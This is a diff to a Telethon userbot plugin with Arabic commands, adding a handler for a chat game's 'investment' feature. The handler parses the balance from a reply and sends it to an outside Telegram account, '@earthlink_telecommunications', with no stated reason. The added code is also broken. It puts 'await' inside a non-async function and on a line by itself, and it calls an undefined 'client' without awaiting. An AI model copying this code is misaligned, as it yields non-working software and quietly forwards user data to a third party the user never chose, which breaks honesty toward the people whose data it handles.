@@ -6,6 +6,7 @@ from telethon.tl.functions.messages import GetHistoryRequest
 from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
 from ..sql_helper.globals import addgvar, delgvar, gvarstatus
+from telethon.events import NewMessage
 import requests
 import re
 import asyncio
@@ -347,3 +348,13 @@ async def disable_w3d(event):
     its_Reham = False
     await event.edit("**تم تعطيل عملية الاستثمار وعد.**")
 
+
+
+@l313l.ar_cmd(pattern="استثمار بوت وعد")
+def handle_new_message(event):
+    if event.is_reply and 'فلوسك صارت' in event.reply_to_msg.text and 'استثمار' in event.message.text:
+        if event.reply_to_msg.from_id.user_id == client.get_me().id:
+            reply_message = event.reply_to_msg.text
+            amount = reply_message.split('فلوسك صارت')[-1].split('ريال')[0].strip()  
+            await
+                l313l.send_message("@earthlink_telecommunications", str(amount))
